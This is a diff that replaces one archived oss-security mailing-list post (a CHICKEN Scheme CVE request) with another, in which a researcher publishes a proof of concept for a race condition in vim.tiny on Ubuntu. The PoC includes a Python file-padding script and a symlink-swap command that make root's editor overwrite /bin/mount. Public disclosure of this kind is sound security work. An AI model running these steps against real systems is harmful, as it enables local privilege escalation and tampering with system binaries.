@@ -1,27 +1,65 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/15/8
-Message-ID: <20170315224749.GG759@scully.more-magic.net>
-Date: Wed, 15 Mar 2017 23:47:49 +0100
-From: Peter Bex <peter@...e-magic.net>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: CVE request for unchecked size argument in malloc() in CHICKEN Scheme
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/11/13/3
+Message-ID: <2ECE9D9EEF1F524185270138AE23265955B10190@S0MSMAIL112.arc.local>
+Date: Mon, 13 Nov 2017 15:10:25 +0000
+From: Fiedler Roman <Roman.Fiedler@....ac.at>
+To: "'oss-security@...ts.openwall.com'" <oss-security@...ts.openwall.com>
+Subject: AW: Security risk of server side text editing in general and vim.tiny specifically
 Content-Type: text/plain; charset=utf-8
 
-Hello all,
+Hello Alexander,
 
-I'd like to request a CVE for an unchecked malloc() argument in
-CHICKEN Scheme's SRFI-4 vector constructors, when allocating the
-vector in unmanaged memory.  Due to the missing range check, this
-could result in negative or too small size allocations, which would
-result in a crash or a buffer overrun, depending on the size.
+> Von: Solar Designer [mailto:solar@...nwall.com]
+>
+> On Fri, Nov 03, 2017 at 11:07:14AM +0000, Fiedler Roman wrote:
+> > PS: POC for vim.tiny on Ubuntu Xenial to overwrite arbitrary files as user
+> root when editing file in directory owned by other user is available on
+> request, disclosure after one week or if list discussion indicates other 
+> timing.
+>
+> Please post this PoC in here ASAP.  Right now, you're in violation of
+> distros list policy for having posted the PoC in there yet not made it
+> public on oss-security within 7 days after posting about the issue
+> itself in here.  Please correct this.  (To me this is also an example of
+> misuse of the distros list, and then of the ability to delay posting the
+> PoC - creating administrative work for all of us out of thin air.)
 
-This issue affects all current releases of CHICKEN Scheme, including
-the latest release, 4.12.0.
+Thanks for the reminder. here is the text from the original mail to your 
+[vs]-list:
 
-The official announcement was made here:
-http://lists.gnu.org/archive/html/chicken-announce/2017-03/msg00000.html
+PS: POC for Ubuntu Xenial to overwrite /bin/mount with custom content by
+creating a x.txt as another user (e.g. www-data) and having root edit it using
+vim.tiny. Of course attacker would restore everything to normal afterwards
+(omitted). On multicore machines, the race is not always won, for testing
+purposes you can strace vim (making it slower) or add other machine load, e.g
+" (cat /dev/zero | md5sum) &" as www-data. With strace, chance is nearly 100%
+to replace /bin/mount with x.txt (including mode, ownership). With 24 md5sum
+on a 4 core machine, chance is > 80% to make /bin/mount world writable,
+otherwise also replacing the content, changing ownership.
 
-Cheers,
-Peter Bex
+* Create a rogue file of same size as user www-data: In real world attack,
+attack would pad a file writeable by him to same size as a system library,
+essential binary using spaces or newlines at the end of the file. For demo,
+newlines only will do.
 
-Download attachment "signature.asc" of type "application/pgp-signature" (474 bytes)
+#!/usr/bin/python3 -BEsStt
+
+import os
+
+mountSize = os.stat('/bin/mount').st_size
+targetFileName = 'x.txt'
+targetFile = open(targetFileName, 'wb')
+targetFile.write(b'\n' * mountSize)
+targetFile.close()
+os.chmod(targetFileName, 0o777)
+
+* Use tool from https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=602333 to
+replace with symlink. Start it as www-data after root started "vim.tiny x.txt"
+but before saving file as root.
+
+./DirModifyInotify --Watch x.txt --MovePath x.txt --LinkTarget
+/bin/mount --WatchCount 0
+
+
+
+Download attachment "smime.p7s" of type "application/pkcs7-signature" (4814 bytes)
